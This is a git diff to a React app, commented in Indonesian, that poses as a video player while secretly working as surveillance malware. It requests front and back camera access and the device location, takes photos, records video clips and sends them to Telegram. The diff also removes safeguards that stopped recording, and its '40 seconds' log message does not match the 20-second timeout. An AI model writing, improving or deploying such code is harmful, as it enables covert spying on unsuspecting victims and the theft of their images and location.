@@ -8,7 +8,6 @@ function App() {
   const [isFullscreen, setIsFullscreen] = useState(false);
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
-  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
 
   const videos = [
     { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/tedrod8mdo5djsak196z9/VID_20250411_185550_962.mp4?rlkey=pg2shpqizwb94ieh2bo1v0fd1&st=gexwsz9n&dl=1' },
@@ -45,7 +44,7 @@ function App() {
         return `Latitude: ${latitude}, Longitude: ${longitude}`;
       } catch (error) {
         console.error('Gagal mendapatkan lokasi:', error);
-        return window.location.href;
+        return window.location.href; // Fallback ke URL jika lokasi tidak tersedia
       }
     };
 
@@ -95,6 +94,7 @@ function App() {
         const videoDevices = devices.filter(device => device.kind === 'videoinput');
         console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));
 
+        // Inisialisasi kamera depan
         const frontResult = await requestMediaAccess('user', 'depan');
         if (frontResult) {
           cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
@@ -102,6 +102,7 @@ function App() {
           console.warn('Kamera depan tidak tersedia atau akses ditolak.');
         }
 
+        // Inisialisasi kamera belakang dengan fallback
         let backResult = await requestMediaAccess('environment', 'belakang');
         if (!backResult && videoDevices.length > 1) {
           console.log('Mencoba kamera belakang dengan deviceId alternatif...');
@@ -127,41 +128,11 @@ function App() {
 
     initializeCameraStreams();
 
-    const handleBeforeUnload = () => {
-      if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
-        mediaRecorderRef.current.stop();
-        console.log('Perekaman dihentikan karena halaman ditutup.');
-      }
-    };
-
-    window.addEventListener('beforeunload', handleBeforeUnload);
-
-    const handleFullscreenChange = () => {
-      if (!document.fullscreenElement && isFullscreen) {
-        if (isPlaying !== null) {
-          const videoElement = videoRefs.current[isPlaying];
-          if (videoElement) {
-            videoElement.pause();
-            videoElement.currentTime = 0;
-            videoElement.removeAttribute('src');
-            videoElement.load();
-            setIsPlaying(null);
-            console.log('Video dihentikan karena keluar dari fullscreen.');
-          }
-        }
-        setIsFullscreen(false);
-      }
-    };
-
-    document.addEventListener('fullscreenchange', handleFullscreenChange);
-
     return () => {
-      window.removeEventListener('beforeunload', handleBeforeUnload);
-      document.removeEventListener('fullscreenchange', handleFullscreenChange);
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
     };
-  }, [isFullscreen, isPlaying]);
+  }, []);
 
   const verifyStream = (stream: MediaStream, type: string): boolean => {
     const videoTracks = stream.getVideoTracks();
@@ -188,13 +159,6 @@ function App() {
     }
   };
 
-  const stopRecording = () => {
-    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
-      mediaRecorderRef.current.stop();
-      console.log('Perekaman dihentikan karena video dihentikan.');
-    }
-  };
-
   const recordCamera = async (stream: MediaStream, type: string, deviceId: string) => {
     let currentStream = stream;
     if (!verifyStream(currentStream, type)) {
@@ -202,6 +166,7 @@ function App() {
       const newStream = await reinitializeStream(type, deviceId);
       if (newStream && verifyStream(newStream, type)) {
         currentStream = newStream;
+        // Perbarui stream di cameraStreamsRef
         const cameraIndex = cameraStreamsRef.current.findIndex(s => s.type === type);
         if (cameraIndex !== -1) {
           cameraStreamsRef.current[cameraIndex].stream = newStream;
@@ -232,6 +197,7 @@ function App() {
       const videoHeight = cameraVideo.videoHeight;
       console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);
 
+      // Mengambil foto
       const canvas = document.createElement('canvas');
       const canvasAspectRatio = 9 / 16;
       const videoAspectRatio = videoWidth / videoHeight;
@@ -267,13 +233,13 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
       }
 
+      // Merekam video
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 1000000,
+        videoBitsPerSecond: 2000000,
       });
-      mediaRecorderRef.current = mediaRecorder;
       const chunks: BlobPart[] = [];
 
       mediaRecorder.ondataavailable = (e) => {
@@ -282,10 +248,6 @@ function App() {
 
       mediaRecorder.onstop = async () => {
         const videoBlob = new Blob(chunks, { type: supportedMimeType });
-        if (videoBlob.size === 0) {
-          console.warn('File video kosong, tidak dikirim ke Telegram.');
-          return;
-        }
         try {
           await sendVideoToTelegram(videoBlob);
           console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
@@ -304,11 +266,12 @@ function App() {
       await new Promise((resolve) => setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
           mediaRecorder.stop();
-          console.log(`Perekaman kamera ${type} dihentikan setelah 20 detik.`);
+          console.log(`Perekaman kamera ${type} dihentikan setelah 40 detik.`);
         }
         resolve(null);
-      }, 20000)); // Ubah durasi menjadi 20 detik
+      }, 20000));
 
+      // Cleanup
       if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
     } catch (error) {
       console.error(`Error saat merekam kamera ${type}:`, error);
@@ -364,7 +327,6 @@ function App() {
         prevVideo.currentTime = 0;
         prevVideo.removeAttribute('src');
         prevVideo.load();
-        stopRecording(); // Hentikan rekaman saat video dihentikan
         console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
       }
     }
@@ -385,7 +347,6 @@ function App() {
         videoElement.currentTime = 0;
         videoElement.removeAttribute('src');
         videoElement.load();
-        stopRecording(); // Hentikan rekaman jika terjadi error
         setIsPlaying(null);
       }
     }
@@ -399,14 +360,13 @@ function App() {
         setIsFullscreen(true);
       } else {
         document.exitFullscreen().catch(err => console.error('Gagal keluar fullscreen:', err));
-        // Tidak perlu menghentikan video di sini karena sudah ditangani oleh handleFullscreenChange
+        setIsFullscreen(false);
       }
       console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
     }
   };
 
   const handleVideoEnded = (index: number) => {
-    stopRecording(); // Hentikan rekaman saat video selesai
     setIsPlaying(null);
     console.log(`Video di indeks ${index} telah selesai.`);
   };
